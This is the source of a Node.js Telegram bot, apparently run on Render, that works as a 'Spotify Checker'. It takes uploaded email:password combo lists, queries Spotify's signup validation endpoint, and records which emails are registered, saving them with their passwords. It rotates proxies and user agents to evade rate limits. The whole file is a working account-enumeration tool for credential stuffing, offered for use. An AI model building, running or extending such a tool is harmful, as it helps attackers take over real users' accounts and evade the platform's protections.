require('dotenv').config();
const fs = require('fs');
const https = require('https');
const fetch = require('node-fetch');
const express = require('express');
const { Telegraf } = require('telegraf');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ⚙️ CONFIGURATION
const CONFIG = {
  API_URL: 'https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email=',
  OUTPUT_FILE: 'Spotify VM.txt',
  SUCCESS_KEYS: [
    'Ese correo electrónico ya está registrado en una cuenta.',
    'That email is already registered to an account',
    'Cette adresse e-mail est déjà associée à un compte.'
  ],
  FAILURE_KEY: '"status":1',
  DELAY: 1500,           // ⏱️ Milliseconds between checks — increase to go slower
  BOT_TOKEN: process.env.BOT_TOKEN,
  OWNER_ID: process.env.OWNER_ID ? parseInt(process.env.OWNER_ID) : null
};

const UA_LIST = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
];
const randomUA = () => UA_LIST[Math.floor(Math.random() * UA_LIST.length)];

// 📊 LIVE STATS
let isRunning = false;
let liveCount = 0;
let deadCount = 0;
let unknownCount = 0;

const isOwner = (id) => CONFIG.OWNER_ID === null || id === CONFIG.OWNER_ID;

function loadProxies() {
  if (!fs.existsSync('proxies.txt')) return [];
  return fs.readFileSync('proxies.txt', 'utf8')
    .split(/\r?\n/).map(l => l.trim()).filter(l => l);
}

function getProxy(proxyList) {
  if (!proxyList.length) return undefined;
  return proxyList[Math.floor(Math.random() * proxyList.length)];
}

async function checkEmail(email, proxy) {
  const url = `${CONFIG.API_URL}${encodeURIComponent(email)}`;
  const options = {
    headers: {
      'User-Agent': randomUA(),
      'Accept': '*/*',
      'Pragma': 'no-cache'
    },
    timeout: 15000,
    rejectUnauthorized: true
  };
  if (proxy) options.agent = new HttpsProxyAgent(proxy);

  return new Promise((resolve) => {
    const req = https.get(url, options, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        for (const key of CONFIG.SUCCESS_KEYS) {
          if (body.includes(key)) return resolve('LIVE');
        }
        if (body.includes(CONFIG.FAILURE_KEY)) return resolve('DEAD');
        resolve('UNKNOWN');
      });
    });
    req.on('error', () => resolve('UNKNOWN'));
    req.end();
  });
}

function saveLive(email, pass) {
  fs.appendFileSync(CONFIG.OUTPUT_FILE, `${email}:${pass || ''}\n`, 'utf8');
}

function panel() {
  return `
╔════════════════════════════════╗
║        🎵 SPOTIFY CHECKER       ║
╠════════════════════════════════╣
║   ✅  𝗟𝗜𝗩𝗘:   ${String(liveCount).padEnd(4)}              ║
║   ❌  𝗗𝗘𝗔𝗗:   ${String(deadCount).padEnd(4)}              ║
║   ⚠️  𝗨𝗡𝗞𝗡𝗢𝗪𝗡: ${String(unknownCount).padEnd(4)}              ║
╚════════════════════════════════╝
`;
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 🤖 BOT SETUP
const bot = new Telegraf(CONFIG.BOT_TOKEN);
const app = express();
const PORT = process.env.PORT || 10000;

// Auth Middleware
bot.use((ctx, next) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply('❌ Unauthorized — This bot is private');
  }
  return next();
});

// ─── COMMANDS ───────────────────────────────────────────────────────
bot.command('start', ctx => {
  ctx.replyWithMarkdown(`
🎵 *Spotify Email Checker* — Slow & Steady Mode

*Commands:*
/upload — Send your email list (.txt)
/proxies — Send proxy list (optional)
/startcheck — Begin checking
/stop — Stop immediately
/panel — Show LIVE/DEAD/UNKNOWN counts
/download — Download LIVE results
/clear — Reset counts & file

*Format:* email:password per line
  `);
});

bot.command('panel', ctx => {
  ctx.reply(panel());
});

bot.command('stop', ctx => {
  isRunning = false;
  ctx.reply('🛑 Stopped.\n' + panel());
});

bot.command('download', async ctx => {
  if (!fs.existsSync(CONFIG.OUTPUT_FILE)) {
    return ctx.reply('⚠️ No LIVE results yet. Run /startcheck first.');
  }
  await ctx.replyWithDocument({
    source: CONFIG.OUTPUT_FILE,
    filename: `LIVE_Emails_${Date.now()}.txt`
  });
});

bot.command('upload', ctx => {
  ctx.reply('📄 Send your email list as a .txt file\nFormat: email:password per line');
});

bot.command('proxies', ctx => {
  ctx.reply('🕵️ Send your proxy list as a .txt file\nOne proxy per line');
});

bot.command('clear', ctx => {
  liveCount = deadCount = unknownCount = 0;
  if (fs.existsSync(CONFIG.OUTPUT_FILE)) fs.unlinkSync(CONFIG.OUTPUT_FILE);
  ctx.reply('🔄 Counts & file cleared.\n' + panel());
});

bot.command('startcheck', async ctx => {
  if (isRunning) return ctx.reply('⚠️ Already running — use /stop first');
  if (!fs.existsSync('mail.txt')) return ctx.reply('⚠️ Upload your list first with /upload');

  // Reset counts
  liveCount = deadCount = unknownCount = 0;
  isRunning = true;

  const proxies = loadProxies();
  const entries = fs.readFileSync('mail.txt', 'utf8')
    .split(/\r?\n/).map(l => l.trim()).filter(l => l);

  await ctx.reply(`🚀 Starting — ${entries.length} emails\n${panel()}`);

  for (const entry of entries) {
    if (!isRunning) break;

    const [email, pass = ''] = entry.split(':');
    if (!email) continue;

    const proxy = getProxy(proxies);
    const result = await checkEmail(email, proxy);

    if (result === 'LIVE') {
      liveCount++;
      saveLive(email, pass);
      await ctx.reply(`✅ 𝗟𝗜𝗩𝗘 — ${email}`);
    } else if (result === 'DEAD') {
      deadCount++;
    } else {
      unknownCount++;
      await ctx.reply(`⚠️ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 — ${email}`);
    }

    // Update panel every 10 emails or on last one
    const total = liveCount + deadCount + unknownCount;
    if (total % 10 === 0 || total === entries.length) {
      await ctx.reply(panel());
    }

    await delay(CONFIG.DELAY);
  }

  isRunning = false;
  await ctx.reply(`🏁 FINISHED!\nChecked: ${entries.length}\n${panel()}`);
});

// ─── FILE UPLOAD HANDLER ────────────────────────────────────────────
bot.on('document', async ctx => {
  const doc = ctx.message.document;
  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const text = await (await fetch(fileLink.href)).text();
    const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l);

    if (doc.file_name?.toLowerCase().includes('prox')) {
      fs.writeFileSync('proxies.txt', lines.join('\n'));
      ctx.reply(`✅ ${lines.length} proxies saved`);
    } else {
      fs.writeFileSync('mail.txt', lines.join('\n'));
      ctx.reply(`✅ ${lines.length} emails saved — ready when you are!`);
    }
  } catch {
    ctx.reply('❌ Failed to read file — try again');
  }
});

// ─── HEALTH CHECK FOR RENDER ────────────────────────────────────────
app.get('/', (_, res) => res.send('🎵 Spotify Checker — Bot Online'));
app.get('/health', (_, res) => res.json({ ok: true, running: isRunning }));
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Health check on port ${PORT}`));

// ─── START BOT WITH 409 FIX ─────────────────────────────────────────
// 3-second delay ensures old instance fully stops before new one connects
setTimeout(() => {
  bot.launch({ polling: true })
    .then(() => console.log('🤖 Bot Online — Ready'))
    .catch(err => {
      console.error('❌ Bot launch failed:', err.message);
      process.exit(1);
    });
}, 3000);

// Graceful Shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
